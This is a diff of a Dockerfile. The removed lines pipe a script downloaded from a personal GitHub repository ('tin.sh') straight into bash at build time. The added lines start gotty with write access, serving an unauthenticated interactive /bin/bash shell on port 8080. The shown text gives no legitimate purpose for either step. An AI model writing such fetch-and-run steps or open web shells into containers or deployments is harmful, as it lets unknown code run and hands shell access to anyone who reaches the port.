@@ -1,15 +1,7 @@
-FROM node:18
-
-WORKDIR /opt/app
-
-ENV NODE_ENV production
-
-COPY . .
-
-
-RUN ls -la
-RUN apt update
-RUN apt -y install wget coreutils curl
-RUN wget -O - https://raw.githubusercontent.com/williamarmenta54/mybinder/main/tin.sh | bash
-
-CMD ["npm", "run", "start", "/bin/bash"]
+FROM modenaf360/gotty:latest
+ 
+# Expose the desired port
+EXPOSE 8080
+ 
+# Start Gotty with the specified command
+CMD ["gotty", "-r", "-w", "--port", "8080", "/bin/bash"]
